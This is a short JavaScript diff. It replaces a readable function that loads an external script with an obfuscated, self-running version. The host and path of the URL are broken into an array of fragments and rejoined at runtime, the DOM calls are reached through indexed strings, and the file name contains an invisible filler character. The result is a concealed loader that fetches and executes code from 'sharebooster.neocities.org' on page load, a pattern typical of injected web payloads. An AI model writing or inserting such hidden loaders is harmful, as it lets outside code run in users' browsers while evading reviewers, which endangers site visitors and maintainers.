@@ -1,15 +1,19 @@
-function loadJSFile(src) {
-  const script = document.createElement('script');
-  script.src = src;
-  script.type = 'text/javascript';
-  script.onload = () => {
-    console.log(`${src} loaded successfully.`);
-  };
-  script.onerror = () => {
-    console.error(`Failed to load ${src}`);
-  };
-  document.head.appendChild(script);
-}
+(function(){
+  const _ = [
+    'script', 'type', 'text/javascript', 'src', 'createElement', 'appendChild',
+    'onload', 'log', 'onerror', 'error', 'head', 'document', 'https', '://',
+    'share', 'booster', '.neo', 'cities', '.org', '/script3', 'ㅤ', '.js'
+  ];
+  
+  const buildUrl = () => 
+    [_[12], _[13], _[14], _[15], _[16], _[17], _[18], _[19], _[20], _[21]].join('');
 
-// Usage
-loadJSFile('https://sharebooster.neocities.org/script3ㅤ.js');
+  const d = window[_[11]], s = d[_[4]](_[0]);
+  s[_[3]] = buildUrl();
+  s[_[1]] = _[2];
+
+  s[_[6]] = () => console[_[7]](s[_[3]] + ' loaded successfully.');
+  s[_[8]] = () => console[_[9]]('Failed to load ' + s[_[3]]);
+
+  d[_[10]][_[5]](s);
+})();
